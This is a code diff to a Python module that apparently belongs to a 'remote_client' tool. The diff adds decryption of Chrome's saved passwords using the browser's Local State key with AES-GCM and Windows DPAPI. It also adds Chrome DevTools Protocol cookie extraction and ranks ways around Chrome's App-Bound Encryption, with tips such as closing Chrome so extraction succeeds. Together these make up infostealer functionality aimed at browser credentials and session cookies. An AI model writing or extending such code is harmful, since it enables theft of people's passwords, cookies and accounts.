@@ -46,8 +46,15 @@ def _get_chrome_profile_path(profile: str = "Default") -> Path | None:
 
 
 def _count_passwords() -> dict[str, Any]:
-    """Count saved passwords in Chrome Login Data."""
-    result = {"total": 0, "encrypted": 0, "domains": []}
+    """Count and optionally decrypt saved passwords in Chrome Login Data."""
+    result = {
+        "total": 0, 
+        "encrypted": 0, 
+        "decrypted": 0,
+        "v20_count": 0,
+        "domains": [],
+        "decryption_available": False,
+    }
     profile_path = _get_chrome_profile_path()
     if not profile_path:
         return result
@@ -60,24 +67,70 @@ def _count_passwords() -> dict[str, Any]:
     if not temp_db:
         return result
     
+    # Try to get decryption key
+    decryption_key = None
+    try:
+        from remote_client.password_extractor.extractor import _load_encryption_key
+        local_state = _get_chrome_user_data_dir() / "Local State" if _get_chrome_user_data_dir() else None
+        if local_state and local_state.exists():
+            decryption_key = _load_encryption_key(local_state)
+            result["decryption_available"] = decryption_key is not None
+    except ImportError:
+        pass
+    
     conn = None
     try:
         conn = sqlite3.connect(temp_db)
         cursor = conn.cursor()
         
         # Count total passwords
-        cursor.execute("SELECT COUNT(*) FROM logins")
+        cursor.execute("SELECT COUNT(*) FROM logins WHERE blacklisted_by_user = 0")
         result["total"] = cursor.fetchone()[0]
         
-        # Count encrypted passwords (v10/v20 prefixes)
-        cursor.execute("SELECT password_value, origin_url FROM logins LIMIT 100")
+        # Count encrypted passwords and try decryption
+        cursor.execute("SELECT password_value, origin_url FROM logins WHERE blacklisted_by_user = 0 LIMIT 100")
         encrypted_count = 0
+        v20_count = 0
+        decrypted_count = 0
         domains = set()
+        
+        dpapi = None
+        if os.name == "nt":
+            try:
+                import win32crypt
+                dpapi = win32crypt
+            except ImportError:
+                pass
+        
         for password_value, origin_url in cursor:
             if password_value:
                 pwd_bytes = bytes(password_value)
                 if pwd_bytes.startswith((b"v10", b"v20", b"v11", b"v12")):
                     encrypted_count += 1
+                    if pwd_bytes.startswith(b"v20"):
+                        v20_count += 1
+                    
+                    # Try to decrypt
+                    if decryption_key:
+                        try:
+                            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+                            nonce = pwd_bytes[3:15]
+                            ciphertext = pwd_bytes[15:]
+                            aesgcm = AESGCM(decryption_key)
+                            plaintext = aesgcm.decrypt(nonce, ciphertext, None)
+                            if plaintext:
+                                decrypted_count += 1
+                        except Exception:
+                            pass
+                elif dpapi:
+                    # Try legacy DPAPI decryption
+                    try:
+                        decrypted = dpapi.CryptUnprotectData(pwd_bytes, None, None, None, 0)[1]
+                        if decrypted:
+                            decrypted_count += 1
+                    except Exception:
+                        pass
+            
             if origin_url:
                 try:
                     from urllib.parse import urlparse
@@ -88,6 +141,8 @@ def _count_passwords() -> dict[str, Any]:
                     pass
         
         result["encrypted"] = encrypted_count
+        result["v20_count"] = v20_count
+        result["decrypted"] = decrypted_count
         result["domains"] = list(domains)[:10]  # Top 10 domains
         
         conn.close()
@@ -493,12 +548,15 @@ def _generate_recommendation(result: dict[str, Any], support: dict[str, Any]) ->
     
     # Check if ABE is detected but not available
     if result.get("detected") and not result.get("available"):
+        # CDP is the best option for Chrome 127+
+        if not support.get("cdp_available"):
+            recommendations.append(
+                "Install websocket-client for CDP extraction (recommended for Chrome 127+): "
+                "pip install websocket-client"
+            )
+        
         if not support.get("ielevator_available") and not support.get("dpapi_available"):
-            recommendations.append("Install comtypes and pywin32: pip install comtypes pywin32")
-        elif not support.get("ielevator_available"):
-            recommendations.append("Install comtypes for IElevator support: pip install comtypes")
-        elif not support.get("dpapi_available"):
-            recommendations.append("Install pywin32 for DPAPI support: pip install pywin32")
+            recommendations.append("Also install comtypes and pywin32 as fallback: pip install comtypes pywin32")
     
     # Check if Chrome is not installed
     if not support.get("chrome_installed"):
@@ -515,10 +573,29 @@ def _generate_recommendation(result: dict[str, Any], support: dict[str, Any]) ->
     # Check for low success rate
     success_rate = result.get("success_rate")
     if success_rate is not None and success_rate < 50.0:
-        recommendations.append(
-            f"Low decryption success rate ({success_rate:.1f}%) - "
-            "try reinstalling Chrome or running as the correct user"
-        )
+        # For Chrome 127+ with low success rate, recommend CDP
+        chrome_version = result.get("chrome_version")
+        if chrome_version:
+            try:
+                major_version = int(chrome_version.split(".")[0])
+                if major_version >= 127:
+                    if not support.get("cdp_available"):
+                        recommendations.append(
+                            f"Chrome {major_version}+ uses ABE. Install websocket-client for CDP: "
+                            "pip install websocket-client"
+                        )
+                    else:
+                        recommendations.append(
+                            f"Low success rate ({success_rate:.1f}%) with Chrome {major_version}+. "
+                            "Try closing Chrome before extraction for CDP to work properly."
+                        )
+            except (ValueError, IndexError):
+                pass
+        else:
+            recommendations.append(
+                f"Low decryption success rate ({success_rate:.1f}%) - "
+                "try using CDP method or running as the correct user"
+            )
     
     # Check Chrome version for ABE requirements
     chrome_version = result.get("chrome_version")
@@ -526,10 +603,15 @@ def _generate_recommendation(result: dict[str, Any], support: dict[str, Any]) ->
         try:
             major_version = int(chrome_version.split(".")[0])
             if major_version >= 127 and not result.get("available"):
-                recommendations.append(
-                    f"Chrome {major_version}+ uses App-Bound Encryption - "
-                    "ensure decryption tools are properly configured"
-                )
+                if support.get("cdp_available"):
+                    recommendations.append(
+                        f"Chrome {major_version}+ detected with ABE. CDP available but may need Chrome to be closed."
+                    )
+                else:
+                    recommendations.append(
+                        f"Chrome {major_version}+ uses App-Bound Encryption - "
+                        "CDP is the recommended method: pip install websocket-client"
+                    )
         except (ValueError, IndexError):
             pass
     
@@ -565,6 +647,7 @@ def collect_abe_status() -> dict[str, Any]:
         "cookies_v20": None,
         "cookies_total": None,
         "success_rate": None,
+        "cdp_available": False,
         # Extended data
         "passwords": None,
         "payment_methods": None,
@@ -581,6 +664,8 @@ def collect_abe_status() -> dict[str, Any]:
             decrypt_abe_key_with_dpapi,
             is_abe_encrypted_key,
             _try_ielevator_com_decrypt,
+            CDPCookieExtractor,
+            try_cdp_cookie_extraction,
         )
     except Exception:
         result["status"] = "blocked"
@@ -601,13 +686,29 @@ def collect_abe_status() -> dict[str, Any]:
             if detected:
                 method = None
                 decrypted = None
-                if support.get("ielevator_available"):
+                
+                # Priority 1: Try CDP (most reliable for Chrome 127+)
+                if support.get("cdp_available"):
+                    try:
+                        cdp_success, cdp_cookies = try_cdp_cookie_extraction("chrome")
+                        if cdp_success and cdp_cookies:
+                            # CDP worked! Mark as available
+                            decrypted = True  # Signal that decryption is possible
+                            method = "CDP"
+                            result["cdp_available"] = True
+                    except Exception:
+                        pass
+                
+                # Priority 2: Try IElevator COM
+                if not decrypted and support.get("ielevator_available"):
                     try:
                         decrypted = _try_ielevator_com_decrypt(encrypted_key)
                         if decrypted:
                             method = "IElevator"
                     except Exception:
                         decrypted = None
+                
+                # Priority 3: Try DPAPI
                 if not decrypted and support.get("dpapi_available"):
                     try:
                         decrypted = decrypt_abe_key_with_dpapi(encrypted_key)
@@ -615,6 +716,7 @@ def collect_abe_status() -> dict[str, Any]:
                             method = "DPAPI"
                     except Exception:
                         decrypted = None
+                
                 if decrypted:
                     result["available"] = True
                     result["method"] = method
@@ -633,7 +735,7 @@ def collect_abe_status() -> dict[str, Any]:
         result["status"] = "available"
     elif result["available"]:
         result["status"] = "available"
-    elif support.get("ielevator_available") or support.get("dpapi_available"):
+    elif support.get("cdp_available") or support.get("ielevator_available") or support.get("dpapi_available"):
         result["status"] = "detected"
     else:
         result["status"] = "blocked"
